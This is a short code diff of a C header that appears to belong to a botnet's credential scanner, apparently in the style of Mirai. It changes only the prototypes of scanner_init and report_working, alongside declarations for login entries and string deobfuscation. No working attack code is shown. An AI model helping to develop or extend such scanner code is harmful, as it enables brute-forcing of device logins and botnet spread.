@@ -45,7 +45,7 @@ struct scanner_connection {
     uint8_t tries;
 };
 
-void scanner_init(char*, char*);
+void scanner_init();
 void scanner_kill(void);
 
 static void setup_connection(struct scanner_connection *);
@@ -59,6 +59,6 @@ static int consume_resp_prompt(struct scanner_connection *);
 
 static void add_auth_entry(char *, char *, uint16_t);
 static struct scanner_auth *random_auth_entry(void);
-static void report_working(ipv4_t, uint16_t, struct scanner_auth *, char*);
+static void report_working(ipv4_t, uint16_t, struct scanner_auth *);
 static char *deobf(char *, int *);
 static BOOL can_consume(struct scanner_connection *, uint8_t *, int);
